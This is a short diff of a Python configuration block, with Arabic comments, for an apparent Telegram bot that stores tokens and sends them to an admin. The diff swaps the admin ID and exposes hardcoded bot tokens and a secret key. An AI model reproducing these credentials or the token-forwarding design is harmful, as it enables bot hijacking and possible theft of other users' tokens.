@@ -12,10 +12,10 @@ stored_tokens = []
 SECRET_KEY = "xazow9wowgowwy29wi282r30wyw0wuoewgwowfepwpwy19192828827297282738383eueo"
 
 # آيدي الأدمن لاستقبال التوكنات
-ADMIN_ID = 7796858163  # استبدله بآيدي الأدمن الحقيقي
+ADMIN_ID = 6839275984  # استبدله بآيدي الأدمن الحقيقي
 
 # البوت المسؤول عن إرسال التوكنات
-MAIN_BOT_TOKEN = "7647664924:AAFFFndSW8pdfn5BytglDLELe7fm-uSOlS8"
+MAIN_BOT_TOKEN = "7705089272:AAHsl4yZEGjdLHVVFlM5DpTT06U-eTPbQJU"
 
 # قفل لمنع التعارض بين الخيوط
 bots_lock = threading.Lock()
